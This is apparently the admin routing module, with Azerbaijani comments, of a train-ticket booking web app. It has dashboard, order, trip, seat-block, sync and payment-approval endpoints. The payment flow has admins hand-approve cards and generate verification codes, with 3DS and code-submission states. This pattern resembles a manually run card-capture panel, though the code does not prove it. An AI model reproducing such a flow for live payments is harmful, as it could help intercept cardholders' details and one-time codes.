const express = require('express');
const dayjs = require('dayjs');
const {
  User, Order, Ticket, Train, Station, Trip, Payment, SeatBlock, SyncLog
} = require('../models/index');
const { requireAdmin } = require('../middleware/auth');
const scheduleService = require('../services/scheduleService');
const paymentService = require('../services/paymentService');
const liveSyncService = require('../services/liveSyncService');
const config = require('../config');
const h = require('../utils/helpers');

/* Panel daxilində keçidlər üçün baza yol */
function adminBase(req) {
  const lang = req.params && req.params.lang ? req.params.lang : config.defaultLocale;
  return '/' + lang + '/admin';
}

/* İdarəetmə panelinin səhifə marşrutları (dil prefiksi altında) */
const pages = express.Router({ mergeParams: true });
/* İdarəetmə API-si (dil prefiksindən asılı deyil) */
const api = express.Router();

async function pendingCount() {
  return Payment.countDocuments({ status: { $in: ['pending_admin', 'code_submitted'] } });
}

/* Panelin bütün səhifələri yalnız idarəçiyə açıqdır */
pages.use(requireAdmin);

/* ==================== İcmal ==================== */
pages.get('/', requireAdmin, async (req, res, next) => {
  try {
    const startOfDay = dayjs().startOf('day').toDate();
    const [
      userCount, orderCount, ticketCount, trainCount, stationCount,
      pending, todayTrips, revenueAgg, recentOrders, pendingPayments, lastSync
    ] = await Promise.all([
      User.countDocuments({ role: 'user' }),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      Train.countDocuments({ active: true }),
      Station.countDocuments({ active: true }),
      pendingCount(),
      Trip.countDocuments({ date: dayjs().format('YYYY-MM-DD') }),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }]),
      Order.find().sort({ createdAt: -1 }).limit(8).lean(),
      Payment.find({ status: { $in: ['pending_admin', 'code_submitted'] } }).sort({ createdAt: -1 }).limit(8).lean(),
      SyncLog.findOne().sort({ createdAt: -1 }).lean()
    ]);

    res.render('pages/admin/dashboard', {
      title: 'İdarəetmə paneli',
      stats: {
        users: userCount,
        orders: orderCount,
        tickets: ticketCount,
        trains: trainCount,
        stations: stationCount,
        pending,
        todayTrips,
        revenue: revenueAgg.length ? revenueAgg[0].total : 0
      },
      recentOrders,
      pendingPayments,
      lastSync,
      startOfDay
    });
  } catch (e) { next(e); }
});

/* ==================== Ödəniş təsdiqləri ==================== */
pages.get('/odenisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'pending';
    const filter = status === 'pending'
      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final'] } }
      : status === 'all' ? {} : { status };

    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
    const orderIds = payments.map((p) => p.order).filter(Boolean);
    const userIds = payments.map((p) => p.user).filter(Boolean);

    const [orders, users] = await Promise.all([
      Order.find({ _id: { $in: orderIds } }).lean(),
      User.find({ _id: { $in: userIds } }).lean()
    ]);

    const orderMap = {};
    orders.forEach((o) => { orderMap[String(o._id)] = o; });
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/payments', {
      title: 'Ödəniş təsdiqləri',
      payments,
      orderMap,
      userMap,
      status,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Sifarişlər ==================== */
pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'all';
    const filter = status === 'all' ? {} : { status };
    const orders = await Order.find(filter).sort({ createdAt: -1 }).limit(120).lean();
    const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/orders', { title: 'Sifarişlər', orders, userMap, status, pending: await pendingCount() });
  } catch (e) { next(e); }
});

/* ==================== Reyslər və yerlər ==================== */
pages.get('/reysler', requireAdmin, async (req, res, next) => {
  try {
    const date = /^\d{4}-\d{2}-\d{2}$/.test(req.query.date || '') ? req.query.date : h.todayISO();
    const line = req.query.line || 'all';
    await scheduleService.ensureTripsForDate(date);
    const rows = await scheduleService.buildTimetableRows(date, line);
    const stations = await Station.find({ active: true }).sort({ order: 1 }).lean();

    /* Reys sənədlərini tapırıq ki, hər sətirdən birbaşa yer ekranına keçmək mümkün olsun */
    const trips = await Trip.find({ date }).select('_id trainNumber').lean();
    const tripMap = {};
    trips.forEach((t) => { tripMap[t.trainNumber] = String(t._id); });
    rows.forEach((r) => { r.tripId = tripMap[r.number] || ''; });

    res.render('pages/admin/trips', {
      title: 'Reyslər və yerlər',
      rows, date, line, stations,
      dateText: h.azDate(date),
      today: h.todayISO(),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    const maps = (trip.classes || []).map((c) => scheduleService.buildSeatMap(trip, c.code)).filter(Boolean);
    const blocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
    const orders = await Order.find({ trip: trip._id, status: 'confirmed' }).lean();

    res.render('pages/admin/trip-detail', {
      title: 'Reys ' + trip.trainNumber,
      trip, maps, blocks, orders,
      dateText: h.azDate(trip.date),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Qatarlar / istifadəçilər / sinxronizasiya ==================== */
pages.get('/qatarlar', requireAdmin, async (req, res, next) => {
  try {
    const line = req.query.line || 'all';
    const filter = line === 'all' ? {} : { line };
    const trains = await Train.find(filter).sort({ number: 1 }).limit(300).lean();
    res.render('pages/admin/trains', { title: 'Qatarlar', trains, line, total: trains.length, pending: await pendingCount() });
  } catch (e) { next(e); }
});

pages.get('/istifadeciler', requireAdmin, async (req, res, next) => {
  try {
    const users = await User.find().sort({ createdAt: -1 }).limit(200).lean();
    res.render('pages/admin/users', { title: 'İstifadəçilər', users, pending: await pendingCount() });
  } catch (e) { next(e); }
});

pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
  try {
    const logs = await SyncLog.find().sort({ createdAt: -1 }).limit(30).lean();
    res.render('pages/admin/sync', {
      title: 'Canlı sinxronizasiya',
      logs,
      sourceUrl: config.liveSourceUrl,
      enabled: config.liveSyncEnabled,
      intervalHours: config.liveSyncHours,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== API: ödəniş addımları ==================== */
api.post('/payments/:id/approve-card', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Kart təsdiqləndi. Doğrulama kodu yaradıldı.', code: result.code });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/approve-final', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Ödəniş təsdiqləndi və biletlər verildi.',
      pnr: result.tickets.length ? result.tickets[0].pnr : ''
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/approve-topup', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.approveTopup(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Balans artırımı təsdiqləndi.', balance: result.balance });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/decline', requireAdmin, async (req, res) => {
  try {
    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
    return res.json({ ok: true, message: 'Ödəniş rədd edildi.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* ==================== API: sifariş statusu ==================== */
api.post('/orders/:id/status', requireAdmin, async (req, res) => {
  try {
    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    order.status = (req.body || {}).status || order.status;
    order.adminNote = (req.body || {}).note || order.adminNote;
    await order.save();
    return res.json({ ok: true, message: 'Status yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: yer bağlama / açma ==================== */
api.post('/trips/:tripId/seats/block', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const wagon = Number(b.wagon);
    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    const seats = [];
    if (typeof b.seat === 'string' && b.seat.indexOf('-') > -1) {
      const parts = b.seat.split('-').map((x) => parseInt(x, 10));
      const from = Math.min(parts[0], parts[1]);
      const to = Math.max(parts[0], parts[1]);
      for (let s = from; s <= to; s += 1) seats.push(s);
    } else {
      seats.push(Number(b.seat));
    }

    let created = 0;
    for (const seat of seats) {
      if (!seat || seat < 1 || seat > cls.seatsPerWagon) continue;
      const sold = (trip.soldSeats || []).some((s) => s.wagon === wagon && s.seat === seat && s.classCode === cls.code);
      if (sold) continue;

      const exists = await SeatBlock.findOne({ trip: trip._id, wagon, seat, classCode: cls.code });
      if (exists) {
        if (!exists.active) {
          exists.active = true;
          exists.reason = b.reason || '';
          exists.createdBy = req.currentUser.email;
          await exists.save();
          created += 1;
        }
      } else {
        await SeatBlock.create({
          trip: trip._id,
          trainNumber: trip.trainNumber,
          date: trip.date,
          wagon,
          seat,
          classCode: cls.code,
          reason: b.reason || '',
          createdBy: req.currentUser.email
        });
        created += 1;
      }
    }

    const activeBlocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
    trip.blockedSeats = activeBlocks.map((bl) => ({ wagon: bl.wagon, seat: bl.seat, classCode: bl.classCode, pnr: '' }));
    await trip.save();

    return res.json({ ok: true, message: created + ' yer bağlandı', created });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/trips/:tripId/seats/unblock', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    if (b.all) {
      await SeatBlock.updateMany({ trip: trip._id }, { $set: { active: false } });
      trip.blockedSeats = [];
      await trip.save();
      return res.json({ ok: true, message: 'Bütün bağlı yerlər açıldı' });
    }

    const wagon = Number(b.wagon);
    const seat = Number(b.seat);
    const block = await SeatBlock.findOne({ trip: trip._id, wagon, seat, classCode: b.classCode });
    if (!block) return res.status(404).json({ ok: false, message: 'Bağlı yer tapılmadı' });

    block.active = false;
    await block.save();

    trip.blockedSeats = (trip.blockedSeats || []).filter((s) => !(s.wagon === wagon && s.seat === seat && s.classCode === b.classCode));
    await trip.save();

    return res.json({ ok: true, message: 'Yer açıldı' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Əməliyyat alınmadı' });
  }
});

/* Vaqon konfiqurasiyası: boş yer sayını dəyişmək */
api.post('/trips/:tripId/config', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    if (b.wagonCount !== undefined) cls.wagonCount = Math.max(1, Math.min(20, Number(b.wagonCount)));
    if (b.seatsPerWagon !== undefined) cls.seatsPerWagon = Math.max(4, Math.min(80, Number(b.seatsPerWagon)));
    if (b.price !== undefined) cls.price = Math.max(0, Number(b.price));

    await trip.save();
    return res.json({ ok: true, message: 'Konfiqurasiya yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: sinxronizasiya ==================== */
api.post('/sync/run', requireAdmin, async (req, res) => {
  try {
    const result = await liveSyncService.runSync('admin:' + req.currentUser.email);
    return res.json({ ok: true, message: 'Sinxronizasiya tamamlandı', result });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message || 'Sinxronizasiya alınmadı' });
  }
});

/* ==================== API: statistikalar ==================== */
api.get('/stats', requireAdmin, async (req, res) => {
  try {
    const [users, orders, tickets, pending, revenue] = await Promise.all([
      User.countDocuments(),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      pendingCount(),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }])
    ]);
    res.json({ ok: true, users, orders, tickets, pending, revenue: revenue.length ? revenue[0].total : 0 });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Statistika alınmadı' });
  }
});

module.exports = { pages, api };
